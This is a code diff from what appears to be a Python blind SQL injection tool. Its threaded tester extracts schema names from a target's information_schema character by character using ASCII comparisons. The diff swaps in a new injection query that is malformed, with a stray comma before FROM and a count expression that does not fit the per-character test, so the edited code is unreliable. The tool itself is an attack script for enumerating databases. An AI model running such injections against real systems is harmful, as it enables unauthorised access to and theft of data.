@@ -23,7 +23,7 @@ class DatabaseCharacterTester(threading.Thread):
             self.get_char()
 
     def test_character(self, character, position, operation=">="):
-        injection_string = "(SELECT count(*) FROM (SELECT SCHEMA_NAME from information_schema.SCHEMATA LIMIT %d,1) as temp where ASCII(SUBSTRING(SCHEMA_NAME, %d, 1))%s%d)" % (self.index - 1, position, operation, character)
+        injection_string = "(SELECT ROUND(length(group_concat(schema_name)) - length(replace(group_concat(schema_name), ',','')) + 1) ,   FROM (SELECT SCHEMA_NAME from information_schema.SCHEMATA LIMIT %d,1) as temp where ASCII(SUBSTRING(SCHEMA_NAME, %d, 1))%s%d)" % (self.index - 1, position, operation, character)
         return core.check_truth(injection_string)
 
     def get_char(self):
@@ -175,8 +175,6 @@ class DatabaseDetector:
             # database_brute_forcer.join()
             core.println("Found database: %s" % database_brute_forcer.get_name())
             self.databases.append(Database(database_brute_forcer.get_name()))
-
-
 
 
 if __name__ == '__main__':
